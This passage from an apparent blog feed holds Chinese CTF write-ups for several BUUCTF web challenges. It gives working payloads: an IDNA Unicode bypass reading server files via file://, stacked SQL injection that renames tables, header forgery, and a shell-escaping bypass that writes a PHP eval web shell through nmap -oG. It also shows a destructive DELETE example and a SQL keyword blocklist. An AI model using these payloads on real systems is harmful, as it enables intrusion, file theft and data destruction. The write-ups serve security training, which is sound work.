      <category term="利用PHP7解析特性bypass" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8PHP7%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7bypass/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-web刷题Ⅱ</title>
    <link href="http://ggb0n.cool/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"/>
    <id>http://ggb0n.cool/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/</id>
    <published>2020-02-10T05:00:01.000Z</published>
    <updated>2020-04-22T00:13:25.538Z</updated>
    
    <content type="html"><![CDATA[<p>刷题刷不停，继续刷！👾👾👾<a id="more"></a></p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><h3 id="考察知识"><a href="#考察知识" class="headerlink" title="考察知识"></a>考察知识</h3><p>考察Black Hat2019的一个议题：在unicode中字符℀(U+2100)，当利用<code>IDNA</code>处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制。<br>关于<code>INDA</code>和<code>UIF-8</code>的漏洞：<a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a><br>此类的字符还有：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">U+<span class="number">2100</span>, ℀</span><br><span class="line">U+<span class="number">2101</span>, ℁</span><br><span class="line">U+<span class="number">2105</span>, ℅</span><br><span class="line">U+<span class="number">2106</span>, ℆</span><br><span class="line">U+FF0F, ／</span><br><span class="line">U+<span class="number">2047</span>, ⁇</span><br><span class="line">U+<span class="number">2048</span>, ⁈</span><br><span class="line">U+<span class="number">2049</span>, ⁉</span><br><span class="line">U+FE16,︖</span><br><span class="line">U+FE56, ﹖</span><br><span class="line">U+FF1F, ？</span><br><span class="line">U+FE5F, ﹟</span><br><span class="line">U+FF03, ＃</span><br><span class="line">U+FE6B, ﹫</span><br><span class="line">U+FF20, ＠</span><br><span class="line">相信总会用到的</span><br></pre></td></tr></table></figure><p>参考Black Hat2019的PPT：<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，给了如下的源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index</span></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">app_index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>我们看到<code>getUrl()</code>会对传入的<code>url</code>做多层处理和过滤：<br>第一层处理及过滤：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br></pre></td></tr></table></figure><p>这里<code>host = parse.urlparse(url).hostname</code>返回传入的<code>url</code>的主机名，这里<code>urlparse</code>是将<code>url</code>字符串拆分为组件，可参考：<a href="https://www.cnblogs.com/jiumo/p/11143741.html">https://www.cnblogs.com/jiumo/p/11143741.html</a><br>在本机测试效果如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.com/index.php'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.com/index.php'</span>).hostname</span><br><span class="line"><span class="string">'www.baidu.com'</span></span><br></pre></td></tr></table></figure><p>这里不会对<code>url</code>中的类似于<code>℀</code>的字符做处理，测试效果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.℀om/index.php'</span>).hostname</span><br><span class="line"><span class="string">'www.baidu.℀om'</span></span><br></pre></td></tr></table></figure><p>因此借助<code>INDA</code>漏洞构造的<code>url</code>可以通过这一步的过滤。<br>第二层处理及过滤：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br></pre></td></tr></table></figure><p><code>urlsplit</code>是将<code>url</code>进行分割，测试：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.com/index.php'</span>)</span><br><span class="line">SplitResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.com/index.php'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="string">'www.baidu.com'</span></span><br></pre></td></tr></table></figure><p>此处利用了一个<a href="https://link.zhihu.com/?target=https%3A//bugs.python.org/issue36216">CVE</a>：<strong>urlsplit不处理 NFKC 标准化</strong>(用 Punycode/IDNA编码的URL使用NFKC规范化来分解字符)，因此对<code>℀</code>类的字符也是处理不了的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.℀om/index.php'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="string">'www.baidu.℀om'</span></span><br></pre></td></tr></table></figure><p>绕过前两层过滤，到第三层处理：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h in host.split(<span class="string">'.'</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br></pre></td></tr></table></figure><p>我们发现，这里是在<code>url</code>的<code>.</code>处进行分割，并加入到<code>newhost[]</code>数组中，但是加入数组之前会继续<code>INDA</code>编码然后<code>UTF-8</code>解码，那么在此处<code>℀</code>类的字符便会被解析为<code>a/c</code>，我们利用此漏洞便可以构造能打入服务器拿flag的payload了。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>我们从前面的代码看到，构造的<code>url</code>的域名需要绕过前两层<code>host == &#39;suctf.cc&#39;</code>的判断，并且要满足第三层的<code>host == &#39;suctf.cc&#39;</code>，那么我们便可以构造域名：<code>suctf.c℆sr</code>便可以绕过对域名的判断。<br>但是现在我们不知道flag文件在哪，但是题目给了提示：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">&lt;!-- <span class="keyword">Do</span> you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>提示我们是基于<code>nginx</code>架构的服务器，那肯定与其配置文件相关<br>这里补充知识：</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">Nginx重要文件位置:</span><br><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br><span class="line">配置文件目录为：<span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/nginx/</span>conf/nginx.conf</span><br></pre></td></tr></table></figure><p>我们读取<code>nignx.conf</code>应该能找到flag文件的位置，构造payload：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span>suctf.c℆sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure><p>利用<code>file</code>协议读取<code>nginx.conf</code>内容如下：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123; <span class="attribute">listen</span> <span class="number">80</span>; <span class="attribute">location</span> / &#123; <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>; &#125; <span class="attribute">location</span> <span class="variable">@app</span> &#123; <span class="attribute">include</span> uwsgi_params; <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock; &#125; <span class="attribute">location</span> /static &#123; <span class="attribute">alias</span> /app/static; &#125; <span class="comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span></span><br></pre></td></tr></table></figure><p>拿到flag文件的位置之后，构造最终payload：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/getUrl?url=file://suctf.<span class="keyword">c</span><span class="symbol">%E2</span><span class="symbol">%84</span><span class="symbol">%86</span>sr/fffffflag</span><br></pre></td></tr></table></figure><p>这里注意<code>℆</code>需要进行url编码。</p><p>拓展一下：python的<code>urlsplit</code>函数其实是比较不完善的，还存在<a href="https://link.zhihu.com/?target=https%3A//bugs.python.org/issue36742">urlsplit NFKD 标准化漏洞</a>，以后遇到的时候需要多加注意。</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>考察<code>http</code>协议的题目，常见也简单。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>查看源码发现一个<code>Secret.php</code>的链接，进去之后提示：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web28.png" alt=""><br>伪造<code>Refer</code>头即可，伪造之后又提示：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web29.png" alt=""><br>伪造<code>UA</code>头即可，然后提示需要来自本地：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web30.png" alt=""><br>伪造<code>IP</code>即可拿到flag<br><img src="http://www.ggb0n.cool/images/BUUCTF-web31.png" alt=""><br>这个地方可以伪造多处，可以伪造<code>x-forwarded-for</code>也可以伪造<code>client-ip</code>，还可以伪造<code>host</code>头，有些时候甚至把三个都伪造上，之前打比赛遇到一个题目就是，巨坑…</p><p>伪造协议头可以通过BP抓包改包，当然有更方便的方法，这里推荐一个火狐/谷歌的插件<code>Header Editor</code>方便好用。</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>考察堆叠注入<br>注入原理：<br>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？答案是会的，这也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用户输入：1; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> products服务器端生成的<span class="keyword">sql</span>语句为：（因未对输入的参数进行过滤）<span class="keyword">Select</span> * <span class="keyword">from</span> products <span class="keyword">where</span> productid=<span class="number">1</span>;<span class="keyword">DELETE</span> <span class="keyword">FROM</span> products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</span><br></pre></td></tr></table></figure><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目可以看到一个提示框，进行注入测试，<code>1&#39;</code>的时候不回显，<code>1&#39;#</code>则回显，说明存在sql注入，<code>order by</code>语句得知有两个字段，但是用<code>union select</code>组合查询的时候提示了过滤的情况：<br><img src="" alt=""><br>可以看到，常用的注入语句基本全被过滤了，网上参考得知是<code>堆叠注入</code>。</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>利用堆叠注入进行注入：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库：1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br><span class="line">爆表：1';<span class="keyword">show</span> <span class="keyword">tables</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查表回显的结果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web33.png" alt="">。<br>我们看到有一个<code>words</code>表和一个<code>1919810931114514</code>表，flag应该在<code>1919810931114514</code>中没错了，看一下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span> //注意以纯数字作为表名，查表的时候需要用反引号</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web34.png" alt=""><br>现在，我们知道flag在<code>1919810931114514</code>表了，但是用去查询的字段都被过滤了，所以需要用其他的方法来获取flag。<br>我们可以看到，在输入<code>1</code>或者<code>2</code>的时候，都会返回一个字符串，因此猜测内部查询语句应该是默认匹配<code>words</code>库的，查询语句也就类似于<code>select id, data from words where id =</code>，因此我们可以把<code>1919810931114514</code>表改名为<code>words</code>表，并且加入<code>id</code>列，同时将<code>flag</code>列改为<code>data</code>列，如此一来，我们查询<code>1&#39; or 1=1#</code>就能拿到flag了。<br>最终构造payload：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’;<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> word1;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="number">1919810931114514</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">Null</span> auto_increment primary <span class="keyword">key</span>; alert table words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>然后<code>1&#39; or 1=1</code>即可拿到flag。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>也是考察堆叠注入，但是与上题不同，本题突破点在于：<strong>mysql中通过set sql_mode=PIPES_AS_CONCAT可以将||视为字符串的连接操作符而非或运算符</strong>，利用语句堆叠设置这个环境变量，然后再通过<code>||</code>拼接查询flag即可。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，和上题一样是一个查询框，可以拿到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到    <code>mysql_multi_query()</code>得知可以堆叠注入，这里关注查询语句<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>可以看到，查询语句是将我们传入的语句与<code>||flag from Flag</code>拼接在一起了，这里补充知识：</p><ul><li>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能。</li></ul><p>因此我们通过堆叠注入设置<code>sql_mode</code>，然后再查询即可。</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>构造最终payload：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><p>非预期解：直接构造payload为<code>*,1</code>即可拿到flag</p><ul><li>字符串<code>或</code>时前面的数字时结果为<code>1</code>则返回<code>1</code>，为<code>0</code>则返回<code>0</code>，效果跟直接*一样。</li></ul><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>考察<code>namp</code>的一个命令<code>-oG</code>，以及<code>escapeshellarg()</code>和<code>escapeshellarg()</code>函数合起来使用造成的漏洞。</p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先看到代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，代码主要是通过利用<code>nmap</code>的命令拼接上我们的输入来执行，参考别人的题解得知<code>namp</code>的一个参数<code>-oG</code>可以向目标机器中写入文件，通过这个参数，我们便可以向目标机器写入一个小马来连接。<br>但是我们只能从<code>host</code>参数来写入内容，那么我们写入的小马代码便会被<code>escapeshellarg()</code>和<code>escapeshellarg()</code>做处理，即将<code>host</code>中包含的字符转义，便可以影响小马的上传，因此需要利用它们结合使用存在的漏洞来绕过。<br>这里可以参考：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a><br>即传入的参数内容中包含<code>&#39;</code>则会造成漏洞，例如：</p><ul><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个不配对儿的<code>&#39;</code>进行了转义</li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，<code>POST</code>数据为<code>a=1&#39;</code>。</li></ul><p>这里我们是利用<code>namp</code>执行命令，那么需要了解一些<code>namp</code>的基本知识：<code>namp -PS 127.0.0.1</code>与<code>namp -PS &#39;&#39; 127.0.0.1</code>与<code>nmap -PS &#39;&quot; &quot;&#39; 127.0.0.1 &quot; &quot;</code>效果是一样的。</p><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>构造payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure><p>写入之后返回了小马存储的路径：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web35.png" alt=""><br>然后去蚁剑连接即可。</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>考察<code>file_get_contents</code>的绕过，以及反序列化。<br>补充知识：<code>file_get_contents</code>的绕过</p><blockquote><p>1、使用<code>php://input</code>伪协议绕过<br>  ①将要<code>GET</code>的参数<code>?xxx=php://input</code><br>  ②用<code>post</code>方法传入想要file_get_contents()函数返回的值<br>2、用<code>data://</code>伪协议绕过<br>  ①将url改为：<code>?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码</code><br>  ②或者将url改为：<code>?xxx=data:text/plain,(url编码的内容)</code><br>3、利用<code>远程文件读取</code>绕过</p></blockquote><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后，给出了一段代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 